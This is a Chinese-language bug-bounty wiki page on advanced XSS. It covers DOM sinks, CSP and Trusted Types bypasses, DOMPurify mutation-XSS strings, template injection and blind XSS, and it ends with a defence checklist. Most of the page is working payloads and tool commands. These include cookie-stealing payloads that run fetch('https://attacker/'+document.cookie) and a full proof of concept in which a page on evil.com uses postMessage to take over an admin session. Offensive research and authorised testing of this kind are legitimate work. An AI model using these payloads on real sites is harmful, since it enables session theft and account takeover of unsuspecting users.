---
type: wiki
category: attack
tool: dalfox,xsstrike,manual
status: active
last-updated: 2026-04-21
---

# XSS 深度攻擊（2026 版）

> **用途：** 2026 年 CSP / Trusted Types / SameSite 讓 reflected XSS 降獎金，但 DOM XSS / Mutation XSS / CSP bypass / Trusted Types bypass 仍是 P2-P1。本文專攻 payload cheatsheet 沒教的深度。

## 0. 分類與 2026 行情

| 類型 | 2026 bounty 等級 | 備註 |
|------|------------------|------|
| Reflected（無 CSP） | P3-P4 | 熱門 program 多半 dupe |
| Reflected（CSP 繞過） | P2-P3 | 顯示 CSP 可繞才有價值 |
| Stored XSS | P2（一般 user）/ P1（admin panel） | 要證明 admin 會看 |
| DOM XSS | P2-P3 | sink 要有明確 user interaction |
| Self-XSS（單獨） | P5 / N/A | 必須鏈 login CSRF 才升級 |
| Mutation XSS（mXSS） | P1-P2 | DOMPurify bypass 級 |
| Trusted Types bypass | P1 | 少見但震撼 |

## 1. DOM XSS Sink 深度

### 1.1 Sink 清單（grep 目標）

```bash
grep -rE 'innerHTML|outerHTML|insertAdjacentHTML|document\.write|document\.writeln|\.html\(|\.append\(|\.prepend\(|\.after\(|\.before\(|eval\(|setTimeout\(|setInterval\(|Function\(|location(\.|\s*=)|window\.open|\.src\s*=|\.href\s*=|\.action\s*=|dangerouslySetInnerHTML' src/
```

### 1.2 Source → Sink 追蹤

```
Source：location.hash / location.search / document.referrer / postMessage / 
        localStorage / sessionStorage / indexedDB / WebSQL / URL fragment

Sink：innerHTML / eval / setTimeout / .src / .href / Function() / document.write
```

### 1.3 postMessage XSS

```html
<!-- evil.com -->
<iframe src="https://target.com/" id="f"></iframe>
<script>
document.getElementById('f').onload = () => {
  document.getElementById('f').contentWindow.postMessage(
    {type:'render', html:'<img src=x onerror=alert(origin)>'}, '*');
};
</script>
```

偵測：

```javascript
// 在 target.com 的 JS 裡找
window.addEventListener('message', (e) => {
  // 若沒驗 e.origin → 任何 site 可發訊息
  document.body.innerHTML = e.data.html;   // sink
});
```

### 1.4 location.hash 經典 sink

```javascript
// 若 app 這樣寫
$(location.hash.slice(1));   // jQuery < 3.5 → 把 #<img> 當 selector+html

// PoC
https://target.com/page#<img src=x onerror=alert(1)>
```

### 1.5 history.pushState → 再 navigate

某些 SPA 用 `location.pathname` 或 `history.state` 填入 DOM：

```
https://target.com/app/"><svg onload=alert(1)>
```

## 2. CSP Bypass 技術

### 2.1 偵測 CSP

```bash
curl -I https://target.com/ | grep -i 'content-security-policy'

# CSP Evaluator
# https://csp-evaluator.withgoogle.com/
# 貼 CSP 看 weak 在哪
```

### 2.2 常見 weak CSP

| 缺陷 | 繞法 |
|------|------|
| `'unsafe-inline'` | 直接寫 `<script>alert(1)</script>` |
| `'unsafe-eval'` | `eval()` / `Function()` / `setTimeout(str)` |
| `script-src *` | 任何 domain 都可 load |
| `script-src self` + 可上傳 JS | 上傳 `.js` 後 `<script src="/uploads/x.js">` |
| `script-src self` + JSONP endpoint | `<script src="/api/jsonp?callback=alert(1)//"></script>` |
| 缺 `base-uri` | `<base href="//evil/">` 讓 relative path 打 attacker server |
| 缺 `object-src 'none'` | `<object data="javascript:alert(1)">` 或 `<embed>` |
| `script-src nonce-XYZ` 被 reflect | 抓到 nonce 後塞 `<script nonce="XYZ">...</script>` |

### 2.3 JSONP 繞 CSP（經典）

```
# CSP: script-src 'self' *.google.com

# 注入
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
# callback 被當 JS 執行 → XSS
```

JSONP endpoint 清單：https://github.com/zigoo0/JSONBee

### 2.4 Angular sandbox escape

若 target 用舊 Angular 且 `script-src 'self' 'unsafe-eval'`：

```html
{{constructor.constructor('alert(1)')()}}
```

### 2.5 Nonce reuse / prediction

某些 server nonce 不 per-request：

```bash
for i in {1..5}; do curl -sI https://target.com/ | grep -i nonce; done
# 若 nonce 相同 → 可重用
```

### 2.6 Dangling markup（無 script）

```html
<!-- 抓 attacker-controlled token，不用 JS -->
<img src="https://evil.com/?token=
<!-- 後續 HTML 被當 URL 一部分 → 資料外流 -->
```

2026 瀏覽器多半擋，但 email client / PDF generator 常沒擋。

## 3. Mutation XSS（mXSS）

### 3.1 原理

DOMPurify 或 browser sanitizer 先 parse HTML → 某些 tag 被 browser 「mutate」成不同結構 → sanitized HTML 再次 serialize → 原本安全的變不安全。

### 3.2 DOMPurify 歷史 bypass（研究靈感）

```html
<!-- CVE-2019-16728 等變體 -->
<style><style/><img src=x onerror=alert(1)>

<!-- CVE-2020-26870 -->
<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src>

<!-- 2024 Masato Kinugawa paper variants -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

最新 bypass：追 Masato Kinugawa / @SecurityMB twitter + GitHub issue tracker。

### 3.3 測試工具

```bash
# 把可疑 sanitizer 輸入丟 mXSS payload
npm install -g dompurify
# 寫 test 腳本 loop payload file

# Lab 環境
git clone https://github.com/cure53/DOMPurify
cd DOMPurify/test
```

### 3.4 常見 mXSS 標靶

- 富文本編輯器（CKEditor / TinyMCE / Quill）的 import/paste
- Email client（Gmail 類）
- Markdown renderer
- 客戶端 template engine（Mustache / Handlebars）

## 4. Trusted Types bypass

### 4.1 背景

Chrome 83+ 支援 `Content-Security-Policy: require-trusted-types-for 'script'`。只有 policy-signed 的 `TrustedHTML` 才能進 sink。

### 4.2 繞法

| 繞法 | 說明 |
|------|------|
| Policy forgiveness | 程式用 `trustedTypes.createPolicy('default', {...})` 但 transform function 偷懶 → 直接 return input |
| DOM clobbering | `<a id=trustedTypes>` 改寫 `window.trustedTypes` |
| `eval('...')` | Trusted Types 擋 innerHTML 但 unsafe-eval 仍開 |
| 已有 policy name | 找 source code 中 `createPolicy('foo', ...)` 的 bug |

```javascript
// 原碼
const p = trustedTypes.createPolicy('default', {
  createHTML: (s) => DOMPurify.sanitize(s)
});
// 若 DOMPurify 有 mXSS → Trusted Types 不救你
```

### 4.3 Post-message clobbering

```html
<iframe name="trustedTypes"></iframe>
<!-- window.trustedTypes 被 clobber → undefined → fallback 可繞 -->
```

## 5. Client-Side Template Injection（CSTI）

### 5.1 AngularJS（1.x）舊版

```
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
```

### 5.2 Vue.js

```
{{_c.constructor('alert(1)')()}}
{{_v.constructor('alert(1)')()}}
```

### 5.3 React（dangerouslySetInnerHTML）

```javascript
// React 不會 sanitize 這個 prop
<div dangerouslySetInnerHTML={{__html: userInput}}/>
```

直接 XSS（React 不是 mutation 擋它）。

## 6. Blind XSS

Stored 但不會在你測試頁面觸發，而是 admin 後台看 support ticket 時觸發：

### 6.1 設 callback

```bash
# 用 XSS Hunter 或自架
curl https://xsshunter.com/register
# 拿到 payload

# 或自架 interactsh
interactsh-client -v
```

### 6.2 Payload

```html
<script src="https://xss.ht/abc123"></script>
<!-- 或 -->
<img src=x onerror=fetch('https://attacker/'+document.cookie)>
```

塞到「admin 會看的地方」：
- Support ticket 內文
- Log message / User-Agent
- 會員名 / 暱稱（在後台會顯示）
- Referer / 註冊 source
- File metadata（EXIF title / comments）

## 7. 工具

### 7.1 Dalfox（主力）

```bash
# Single URL
dalfox url 'https://target.com/?q=FUZZ' --cookie 'session=...'

# 從 URL list（gau output）
cat urls.txt | dalfox pipe --blind https://xss.ht/abc

# Mining DOM + param discovery
dalfox url https://target.com/ --mining-dom --mining-dict-word /path/to/params.txt
```

### 7.2 XSStrike

```bash
git clone https://github.com/s0md3v/XSStrike
cd XSStrike
python xsstrike.py -u "https://target.com/?q=1" --fuzzer
```

### 7.3 kxss（grep pattern sink）

```bash
echo https://target.com/ | hakrawler | kxss
# 找反射點 + 自動標出哪些 char unescaped
```

### 7.4 DOM Invader（Burp Pro）

開啟 → 自動追蹤 source/sink + postMessage + DOM clobbering。

### 7.5 CSP Evaluator

```
https://csp-evaluator.withgoogle.com/
```

### 7.6 JSONBee（JSONP endpoint 資料庫）

```
https://github.com/zigoo0/JSONBee
```

## 8. 完整 PoC：Stored DOM XSS via postMessage 到 Admin panel

### Step 1: 找 postMessage handler

```javascript
// target.com/admin.js
window.addEventListener('message', (e) => {
  document.getElementById('preview').innerHTML = e.data.html;
});
// 沒驗 origin
```

### Step 2: evil.com

```html
<iframe src="https://target.com/admin" id="f"></iframe>
<script>
setTimeout(() => {
  document.getElementById('f').contentWindow.postMessage({
    html: `<img src=x onerror="fetch('https://attacker/'+document.cookie)">`
  }, '*');
}, 2000);
</script>
```

### Step 3: Admin 訪問 evil.com → cookie 外流 → ATO

### Step 4: 報告

```markdown
## 漏洞概述
https://target.com/admin.js 的 message event handler 未驗證 e.origin，
攻擊者可從 evil.com 送 postMessage 觸發 innerHTML injection，竊取 admin
session cookie（HttpOnly 無效，因為 cookie 用 document.cookie 不讀；改成
從 fetch API 驗證 response 中的 secrets）。

## Impact
- Admin session cookie 外流 → 後台接管
- 前提：admin 瀏覽 attacker 連結（常見於 phishing）

## Severity
P1 / Critical（admin takeover）

## 修補
1. 驗證 e.origin === 'https://target.com'
2. sink 改用 textContent 或 DOMPurify.sanitize
3. 啟用 Trusted Types
```

## 9. 防禦 checklist

```
1. 輸出一律 context-aware escape（HTML / JS / URL / CSS）
2. 禁用 innerHTML / document.write，改 textContent / createElement
3. CSP: default-src 'self'; script-src 'self' 'nonce-...'; object-src 'none'; base-uri 'self';
4. DOMPurify 或等價 sanitizer，常更新
5. Trusted Types policy 嚴格定義，不要偷懶 default policy
6. postMessage handler 永遠驗 origin
7. jQuery 升 3.5+（修了 hash XSS）
8. Framework：React 避 dangerouslySetInnerHTML，Angular 用 DomSanitizer，Vue 避 v-html
9. Email / PDF 輸出走獨立 renderer + sanitize
```

## 關聯文件

- [18-payload-cheatsheet.md](18-payload-cheatsheet.md) — XSS polyglot
- [25-tool-dalfox.md](25-tool-dalfox.md) — Dalfox 完整操作
- [63-prototype-pollution.md](63-prototype-pollution.md) — PP 配 XSS gadget
- [64-cache-poisoning.md](64-cache-poisoning.md) — reflected → stored via cache
- PortSwigger XSS：https://portswigger.net/web-security/cross-site-scripting
- CSP Evaluator：https://csp-evaluator.withgoogle.com/
- Masato Kinugawa mXSS：https://research.securitum.com/mutation-xss-via-namespace-confusion-dompurify-2-0-17-bypass/
